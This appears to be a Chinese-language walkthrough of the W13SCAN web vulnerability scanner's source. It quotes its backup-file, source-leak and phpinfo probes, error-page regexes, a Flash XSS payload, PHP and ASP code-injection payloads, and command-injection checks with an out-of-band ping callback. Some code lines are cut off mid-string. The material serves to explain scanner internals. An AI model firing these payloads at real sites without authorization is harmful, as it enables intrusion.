    elif exi == ".jsp" or exi == ".do" or exi == ".action": 
        self.response.programing.append(WEB_PLATFORM.JAVA) 
    for name, values in KB["fingerprint"].items(): 
        if not getattr(self.response, name): 
            _result = [] 
            for mod in values: 
                m = mod.fingerprint(self.response.headers, self.response.text) 
                if isinstance(m, str): 
                    _result.append(m) 
                if isListLike(m): 
                    _result += list(m) 
            if _result: 
                setattr(self.response, name, _result) 
    # Fingerprint basic end 
    if KB["spiderset"].add(url, 'PerFile'): 
        task_push('PerFile', self.requests, self.response) 
    # Send PerServer 
    p = urlparse(url) 
    domain = "{}://{}".format(p.scheme, p.netloc) 
    if KB["spiderset"].add(domain, 'PerServer'): 
        req = requests.get(domain, headers=headers, allow_redirects=False) 
        fake_req = FakeReq(domain, headers, HTTPMETHOD.GET, "") 
        fake_resp = FakeResp(req.status_code, req.content, req.headers) 
        task_push('PerServer', fake_req, fake_resp) 
    # Collect directory from response 
    urls = set(get_parent_paths(url)) 
    for parent_url in urls: 
        if not KB["spiderset"].add(parent_url, 'get_link_directory'): 
            continue 
        req = requests.get(parent_url, headers=headers, allow_redirects=False) 
        if KB["spiderset"].add(req.url, 'PerFolder'): 
            fake_req = FakeReq(req.url, headers, HTTPMETHOD.GET, "") 
            fake_resp = FakeResp(req.status_code, req.content, req.headers) 
            task_push('PerFolder', fake_req, fake_resp) 
PerServer 检测模块 对每个domain的
 W13SCAN/scanners/PerServer 
backup_domain 基于域名的备份文件
使用tld  from tld import parse_tld 
from tld import parse_tld 
parse_tld('http://www.google.com') 
# 'com', 'google', 'www' 
生成payload 然后拼接rar zip 请求获取文件 
这里还读取了下文件的前面几个buf看下文件头是否正确
payloads = parse_tld(domain, fix_protocol=True, fail_silently=True) 
for payload in payloads: 
    if not payload: 
        continue 
    for i in ['.rar', '.zip']: 
        test_url = domain + payload + i 
        r = requests.get(test_url, headers=headers, allow_redirects=False, stream=True) 
        try: 
            content = r.raw.read(10) 
        except: 
            continue 
        if r.status_code == 200 and self._check(content): 
            if int(r.headers.get('Content-Length', 0)) == 0: 
                continue 
如果文件存在且 文件头判断过了会新生成个result
result = self.new_result() 
result.init_info(self.requests.url, "备份文件下载", VulType.BRUTE_FORCE) 
result.add_detail("payload请求", r.reqinfo, content.decode(errors='ignore'), 
                    "备份文件大小:{}M".format(rarsize), "", "", PLACE.GET) 
self.success(result) 
errorpage 错误暴露信息
 W13SCAN/scanners/PerServer/errorpage.py 
访问一个不存在的错误页面 可以从页面中获取信息
使用这个方法匹配  sensitive_page_error_message_check  
里面是通过下面的正则匹配
error的匹配正则
http_smuggling http smuggling 走私攻击
errors = [ 
    {'regex': '"Message":"Invalid web service call', 'type': 'ASP.Net'}, 
    {'regex': 'Exception of type', 'type': 'ASP.Net'}, 
    {'regex': '--- End of inner exception stack trace ---', 'type': 'ASP.Net'}, 
    {'regex': 'Microsoft OLE DB Provider', 'type': 'ASP.Net'}, 
    {'regex': 'Error ([\d-]+) \([\dA-Fa-f]+\)', 'type': 'ASP.Net'}, 
    {'regex': 'at ([a-zA-Z0-9_]*\.)*([a-zA-Z0-9_]+)\([a-zA-Z0-9, \[\]\&\;]*\)', 'type': 'ASP.Net'}, 
    {'regex': '([A-Za-z]+[.])+[A-Za-z]*Exception: ', 'type': 'ASP.Net'}, 
    {'regex': 'in [A-Za-z]:\([A-Za-z0-9_]+\)+[A-Za-z0-9_\-]+(\.aspx)?\.cs:line [\d]+', 'type': 'ASP.N
    {'regex': 'Syntax error in string in query expression', 'type': 'ASP.Net'}, 
    {'regex': '\.java:[0-9]+', 'type': 'Java'}, {'regex': '\.java\((Inlined )?Compiled Code\)', 'type
    {'regex': '\.invoke\(Unknown Source\)', 'type': 'Java'}, {'regex': 'nested exception is', 'type':
    {'regex': '\.js:[0-9]+:[0-9]+', 'type': 'Javascript'}, {'regex': 'JBWEB[0-9]{{6}}:', 'type': 'JBo
    {'regex': '((dn|dc|cn|ou|uid|o|c)=[\w\d]*,\s?){2,}', 'type': 'LDAP'}, 
    {'regex': '\[(ODBC SQL Server Driver|SQL Server|ODBC Driver Manager)\]', 'type': 'Microsoft SQL S
    {'regex': 'Cannot initialize the data source object of OLE DB provider "[\w]*" for linked server 
        'type': 'Microsoft SQL Server'}, { 
        'regex': 'You have an error in your SQL syntax; check the manual that corresponds to your MyS
        'type': 'MySQL'}, 
    {'regex': 'Illegal mix of collations \([\w\s\,]+\) and \([\w\s\,]+\) for operation', 'type': 'MyS
    {'regex': 'at (\/[A-Za-z0-9\.]+)*\.pm line [0-9]+', 'type': 'Perl'}, 
    {'regex': '\.php on line [0-9]+', 'type': 'PHP'}, {'regex': '\.php on line [0-9]+', 'type'
    {'regex': 'Fatal error:', 'type': 'PHP'}, {'regex': '\.php:[0-9]+', 'type': 'PHP'}, 
    {'regex': 'Traceback \(most recent call last\):', 'type': 'Python'}, 
    {'regex': 'File "[A-Za-z0-9\-_\./]*", line [0-9]+, in', 'type': 'Python'},
    {'regex': '\.rb:[0-9]+:in', 'type': 'Ruby'}, {'regex': '\.scala:[0-9]+', 'type': 'Scala'}, 
    {'regex': '\(generated by waitress\)', 'type': 'Waitress Python server'}, { 
        'regex': '132120c8|38ad52fa|38cf013d|38cf0259|38cf025a|38cf025b|38cf025c|38cf025d|38cf025e|38
        'type': 'WebSEAL'}, 
    {'type': 'ASPNETPathDisclosure', 
        'regex': "Invalid\sfile\sname\sfor\smonitoring:\s'([^']*)'\.\sFile\snames\sfor\smonito
    {'type': 'Struts2DevMod', 
        'regex': 'You are seeing this page because development mode is enabled.  Development mode, or
    {'type': 'Django DEBUG MODEL', 
        'regex': "You're seeing this error because you have DEBUG = True in"}, 
    {'type': 'RailsDevMode', 'regex': 'Action Controller: Exception caught'}, 
    {'type': 'RequiredParameter', 'regex': "Required\s\w+\sparameter\s'([^']+?)'\sis\snot\spresent"},
    {'type': 'Thinkphp3 Debug', 'regex': ':\('}, 
    {'type': 'xdebug', "regex": "class='xdebug-error xe-fatal-error'"} 
] 
这里直接return了
idea idea目录解析
 W13SCAN/scanners/PerServer/idea.py 
先请求 xml  payload = domain + ".idea/workspace.xml"  然后判断后输出
iis_parse iis解析漏洞
 W13SCAN/scanners/PerServer/iis_parse.py  
请求  domain/robots.txt/.php  
判断请求头 响应体
payload = domain + "robots.txt/.php" 
r = requests.get(payload, headers=headers, allow_redirects=False) 
ContentType = r.headers.get("Content-Type", '') 
if 'html' in ContentType and "allow" in r.text: 
net_xss net 通杀xss
请求了两个payload
payload = "(A({}))/".format(random_str(6)) 
url = domain + payload 
new_payload = "(A(\"onerror='{}'{}))/".format(random_str(6), random_str(6)) 
url2 = domain + new_payload 
在响应中没有编码还是存就认为是存在的
swf_files 通用flash的xss
多个swf加payload 然后计算返回的页面的md5值来判断
PerFolder 检测模块 针对url的目录，会分隔目录分别访问
backup_folder 扫描备份文件
 W13SCAN/scanners/PerFolder/backup_folder.py 
测试的路径 因为传入的时候是拆分了url的目录的所以这里会都测
directory_browse 判断是否是目录遍历
 W13SCAN/scanners/PerFolder/directory_browse.py 
判断响应页面里有没有如下内容
flag_list = [ 
    "directory listing for", 
    "directory", 
    "index of", 
    '', 
] 
FileList = [] 
FileList.append(arg + 'common/swfupload/swfupload.swf') 
FileList.append(arg + 'adminsoft/js/swfupload.swf') 
FileList.append(arg + 'statics/js/swfupload/swfupload.swf') 
FileList.append(arg + 'images/swfupload/swfupload.swf') 
FileList.append(arg + 'js/upload/swfupload/swfupload.swf') 
FileList.append(arg + 'addons/theme/stv1/_static/js/swfupload/swfupload.swf') 
FileList.append(arg + 'admin/kindeditor/plugins/multiimage/images/swfupload.swf') 
FileList.append(arg + 'includes/js/upload.swf') 
FileList.append(arg + 'js/swfupload/swfupload.swf') 
FileList.append(arg + 'Plus/swfupload/swfupload/swfupload.swf') 
FileList.append(arg + 'e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf') 
FileList.append(arg + 'include/lib/js/uploadify/uploadify.swf') 
FileList.append(arg + 'lib/swf/swfupload.swf') 
md5_list = [ 
    '3a1c6cc728dddc258091a601f28a9c12', 
    '53fef78841c3fae1ee992ae324a51620', 
    '4c2fc69dc91c885837ce55d03493a5f5', 
] 
for payload in FileList: 
    payload1 = payload + "?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22xss
    req = requests.get(payload1, headers=self.requests.headers) 
    if req.status_code == 200: 
        md5_value = md5(req.content) 
['bak.rar', 'bak.zip', 'backup.rar', 'backup.zip', 'www.zip', 'www.rar', 'web.rar', 'web.zip','wwwroo
phpinfo_craw 查看此目录下是否存在 phpinfo文件
 W13SCAN/scanners/PerFolder/phpinfo_craw.py 
请求这几个文件后判断是否有  phpinfo() 
variants = [ 
    "phpinfo.php", 
    "pi.php", 
    "php.php", 
    "i.php", 
    "test.php", 
    "temp.php", 
    "info.php", 
] 
repository_leak 基于流量动态查找目录下源码泄露
 W13SCAN/scanners/PerFolder/repository_leak.py  
请求key 判断响应里是否存在value
flag = { 
    "/.svn/all-wcprops": "svn:wc:ra_dav:version-url", 
    "/.git/config": 'repositoryformatversion[\s\S]*', 
    "/.bzr/README": 'This\sis\sa\sBazaar[\s\S]', 
    '/CVS/Root': ':pserver:[\s\S]*?:[\s\S]*', 
    '/.hg/requires': '^revlogv1.*' 
} 
PerFile 检测模块 针对每个文件，包括参数
analyze_parameter 反序列化参数分析插件
 from api import isJavaObjectDeserialization, isPHPObjectDeserialization, isPythonObjectDeserialization 
 W13SCAN/lib/helper/function.py#L27 
如下是通过value值来判断是否是反序列化的 
通过 魔术头 正则
backup_file 基于文件的备份扫描
 W13SCAN/scanners/PerFile/backup_file.py  
对url动态生成 备份文件扫描
def isJavaObjectDeserialization(value): 
    if len(value)  index.php.bak index.bak index.rar 
a, b = os.path.splitext(url) 
if not b: 
    return 
payloads = [] 
payloads.append(a + ".bak") 
payloads.append(a + ".rar") 
payloads.append(a + ".zip") 
payloads.append(url + ".bak") 
payloads.append(url + ".rar") 
payloads.append(url + ".zip") 
command_asp_code asp代码注入
 W13SCAN/scanners/PerFile/command_asp_code.py  
只支持回显型的asp代码注入
payload
_payloads = [ 
    'response.write({}*{})'.format(randint1, randint2), 
    '\'+response.write({}*{})+\''.format(randint1, randint2), 
    '"response.write({}*{})+"'.format(randint1, randint2), 
] 
command_php_code php代码注入
 W13SCAN/scanners/PerFile/command_php_code.py 
如果不是php的直接返回 是php的才进行处理
payload print MD5值
_payloads = [ 
    "print(md5({}));".format(randint), 
    ";print(md5({}));".format(randint), 
    "';print(md5({}));$a='".format(randint), 
    "\";print(md5({}));$a=\"".format(randint), 
    "${{@print(md5({}))}}".format(randint), 
    "${{@print(md5({}))}}\\".format(randint), 
    "'.print(md5({})).'".format(randint) 
] 
command_system 系统命令注入
 W13SCAN/scanners/PerFile/command_system.py 
定义了 一个字典 
执行的命令 和可以匹配的回显 
如果是windows的机器那么就去掉 echo的 
如果是无回显使用反连平台
 reverse_payload = "ping -nc 1 {}".format(fullname) 
url_flag = { 
    "set|set&set": [ 
        'Path=[\s\S]*?PWD=', 
        'Path=[\s\S]*?PATHEXT=', 
        'Path=[\s\S]*?SHELL=', 
        'Path\x3d[\s\S]*?PWD\x3d', 
        'Path\x3d[\s\S]*?PATHEXT\x3d', 
        'Path\x3d[\s\S]*?SHELL\x3d', 
        'SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=', 